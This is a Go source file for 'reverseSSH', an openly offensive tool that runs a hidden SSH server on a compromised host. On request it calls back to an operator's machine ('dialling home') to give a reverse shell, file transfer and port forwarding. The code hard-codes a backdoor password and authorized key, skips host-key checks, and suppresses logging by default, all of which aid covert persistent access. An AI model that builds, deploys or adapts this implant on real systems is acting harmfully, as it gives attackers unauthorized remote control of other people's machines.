// reverseSSH - a lightweight ssh server with a reverse connection feature
// Copyright (C) 2021  Ferdinor <ferdinor@mailbox.org>

// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.

// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.

package main

import (
	"bytes"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"path"
	"strings"
	"syscall"

	"github.com/gliderlabs/ssh"
	"github.com/pkg/sftp"
	gossh "golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/terminal"
)

// The following variables can be set via ldflags
var (
	localPassword = "letmeinbrudipls"
	authorizedKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKlbJwr+ueQ0gojy4QWr2sUWcNC/Y9eV9RdY3PLO7Bk/ Brudi"
	defaultShell  = "/bin/bash"
	version       = "0.0.0-dev"
)

var help = fmt.Sprintf(`reverseSSH %[2]s  Copyright (C) 2021  Ferdinor <ferdinor@mailbox.org>

Usage: %[1]s [options] [<user>@]<target>

Examples:
  Bind:
	%[1]s
	%[1]s -v -l :4444
  Reverse:
	%[1]s -p 31337 192.168.0.1
	%[1]s -v -b 0 kali@192.168.0.2

Options:
	-s, Shell to use for incoming connections, e.g. /bin/bash; no effect for windows (default: %[5]s)
	-l, Bind scenario only: listen at this address:port (default: :31337)
	-p, Reverse scenario only: ssh port at home (default: 22)
	-b, Reverse scenario only: bind to this port after dialling home (default: 8888)
	-v, Emit log output

<target>
	Optional target which enables the reverse scenario. Can be prepended with
	<user>@ to authenticate as a different user than 'reverse' while dialling home.

Credentials:
	Accepting all incoming connections from any user with either of the following:
	 * Password "%[3]s"
	 * PubKey   "%[4]s"
`, path.Base(os.Args[0]), version, localPassword, authorizedKey, defaultShell)

func dialHomeAndServe(homeTarget string, homeBindPort uint, server ssh.Server) error {
	var (
		err         error
		client      *gossh.Client
		sshHomeUser string
		sshHomeAddr string
	)

	if homeBindPort > 0xffff || homeBindPort < 0 {
		return fmt.Errorf("%d is not a valid port number", homeBindPort)
	}

	target := strings.Split(homeTarget, "@")
	switch len(target) {
	case 1:
		sshHomeUser = "reverse"
		sshHomeAddr = target[0]
	case 2:
		sshHomeUser = target[0]
		sshHomeAddr = target[1]
	default:
		log.Fatalf("Could not parse '%s'", target)
	}

	config := &gossh.ClientConfig{
		User: sshHomeUser,
		Auth: []gossh.AuthMethod{
			gossh.Password(localPassword),
		},
		HostKeyCallback: gossh.InsecureIgnoreHostKey(),
	}

	// Attempt to connect with localPassword initially and keep asking for password on failure
	for {
		client, err = gossh.Dial("tcp", sshHomeAddr, config)
		if err == nil {
			break
		} else if strings.HasSuffix(err.Error(), "no supported methods remain") {
			fmt.Println("Enter password:")
			data, err := terminal.ReadPassword(int(syscall.Stdin))
			if err != nil {
				log.Println(err)
				continue
			}

			config.Auth = []gossh.AuthMethod{
				gossh.Password(string(data)),
			}
		} else {
			return err
		}
	}
	defer client.Close()

	ln, err := client.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", homeBindPort))
	if err != nil {
		return err
	}

	log.Printf("Success: listening on port %d at home", homeBindPort)
	return server.Serve(ln)
}

func SFTPHandler(s ssh.Session) {
	server, err := sftp.NewServer(s)
	if err != nil {
		log.Printf("Sftp server init error: %s\n", err)
		return
	}

	log.Printf("New sftp connection from %s", s.RemoteAddr().String())
	if err := server.Serve(); err == io.EOF {
		server.Close()
		log.Println("Sftp connection closed by client")
	} else if err != nil {
		log.Println("Sftp server exited with error:", err)
	}
}

func main() {
	var (
		homeSshPort  uint
		homeBindPort uint
		shell        string
		bindAddr     string
		verbose      bool
	)

	flag.Usage = func() {
		fmt.Print(help)
		os.Exit(1)
	}

	flag.UintVar(&homeSshPort, "p", 22, "")
	flag.UintVar(&homeBindPort, "b", 8888, "")
	flag.StringVar(&shell, "s", defaultShell, "")
	flag.StringVar(&bindAddr, "l", ":31337", "")
	flag.BoolVar(&verbose, "v", false, "")
	flag.Parse()

	if !verbose {
		log.SetOutput(ioutil.Discard)
	}

	var (
		forwardHandler = &ssh.ForwardedTCPHandler{}
		server         = ssh.Server{
			Handler: makeSSHSessionHandler(shell),
			Addr:    bindAddr,
			PasswordHandler: ssh.PasswordHandler(func(ctx ssh.Context, pass string) bool {
				passed := pass == localPassword
				if passed {
					log.Printf("Successful authentication with password from %s@%s", ctx.User(), ctx.RemoteAddr().String())
				} else {
					log.Printf("Invalid password from %s@%s", ctx.User(), ctx.RemoteAddr().String())
				}
				return passed
			}),
			PublicKeyHandler: ssh.PublicKeyHandler(func(ctx ssh.Context, key ssh.PublicKey) bool {
				master, _, _, _, err := ssh.ParseAuthorizedKey([]byte(authorizedKey))
				if err != nil {
					log.Println("Encountered error while parsing public key:", err)
					return false
				}
				passed := bytes.Compare(key.Marshal(), master.Marshal()) == 0
				if passed {
					log.Printf("Successful authentication with ssh key from %s@%s", ctx.User(), ctx.RemoteAddr().String())
				} else {
					log.Printf("Invalid ssh key from %s@%s", ctx.User(), ctx.RemoteAddr().String())
				}
				return passed
			}),
			LocalPortForwardingCallback: ssh.LocalPortForwardingCallback(func(ctx ssh.Context, dhost string, dport uint32) bool {
				log.Printf("Accepted forward to %s:%d", dhost, dport)
				return true
			}),
			ReversePortForwardingCallback: ssh.ReversePortForwardingCallback(func(ctx ssh.Context, host string, port uint32) bool {
				log.Printf("Attempt to bind at %s:%d granted", host, port)
				return true
			}),
			ChannelHandlers: map[string]ssh.ChannelHandler{
				"direct-tcpip": ssh.DirectTCPIPHandler,
				"session":      ssh.DefaultSessionHandler,
			},
			RequestHandlers: map[string]ssh.RequestHandler{
				"tcpip-forward":        forwardHandler.HandleSSHRequest,
				"cancel-tcpip-forward": forwardHandler.HandleSSHRequest,
			},
			SubsystemHandlers: map[string]ssh.SubsystemHandler{
				"sftp": SFTPHandler,
			},
		}
	)

	switch len(flag.Args()) {
	case 0:
		log.Printf("Starting ssh server on %s", bindAddr)
		log.Fatal(server.ListenAndServe())
	case 1:
		log.Printf("Dialling home via ssh to %s:%d", flag.Args()[0], homeSshPort)
		log.Fatal(dialHomeAndServe(fmt.Sprintf("%s:%d", flag.Args()[0], homeSshPort), homeBindPort, server))
	default:
		log.Println("Invalid arguments, check usage!")
		os.Exit(1)
	}
}
